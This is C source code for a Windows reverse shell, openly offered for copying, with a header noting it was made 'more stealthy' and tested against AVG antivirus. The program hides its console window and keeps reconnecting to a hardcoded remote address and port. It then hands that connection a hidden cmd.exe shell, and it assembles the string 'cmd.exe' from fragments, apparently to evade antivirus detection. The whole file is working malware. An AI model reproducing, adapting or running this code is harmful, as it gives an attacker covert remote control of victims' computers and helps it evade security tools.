/* Windows Reverse Shell 
Test under windows 7 with AVG Free Edition.
Author: Ma~Far$ (a.k.a. Yahav N. Hoffmann)
Writen 2016 - Modified 2016
This program is open source you can copy and modify, but please keep author credit!
Made a bit more stealthy by infoskirmish.com - 2017
*/

#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "w2_32")
int hideConsole ( void );

WSADATA wsaData;
SOCKET Winsock;
SOCKET Sock;
struct sockaddr_in hax;
char aip_addr[16];
STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;
  

int main(int argc, char *argv[]) 
{
	
	hideConsole ();
	unsigned short ServPort;
	char *ServIP;
	ServIP = "192.168.43.1";
    ServPort = 9001;
	while(1){
	//-lws2_32
	WSAStartup(MAKEWORD(2,2), &wsaData);
	Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
    
    	if (ServIP == NULL){
		exit(1);
	}

    	struct hostent *host;
	host = gethostbyname(ServIP);
	strcpy(aip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));
    
	hax.sin_family = AF_INET;
	hax.sin_port = htons(ServPort);
	hax.sin_addr.s_addr =inet_addr(aip_addr);
    
	
	
	start:
    while (WSAConnect(Winsock,(SOCKADDR*)&hax, sizeof(hax),NULL,NULL,NULL,NULL) != 0)
    {
        Sleep(600);
		
        goto start;
    }
	
	
	if (WSAGetLastError() == 0) {

		memset(&ini_processo, 0, sizeof(ini_processo));

		ini_processo.cb=sizeof(ini_processo);
		ini_processo.dwFlags=STARTF_USESTDHANDLES;
		ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

		char *myArray[4] = { "cm", "d.e", "x", "e" };
		char command[8] = "";
		snprintf( command, sizeof(command), "%s%s%s%s", myArray[0], myArray[1], myArray[2], myArray[3]);

		CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
		
	} else {
	
		exit(0);
		
	} 
	}	
}





int hideConsole ( void )
{
  

HWND hWnd = GetConsoleWindow();
   // ShowWindow( hWnd, SW_MINIMIZE );
    ShowWindow( hWnd, SW_HIDE );

return 0;
}
 


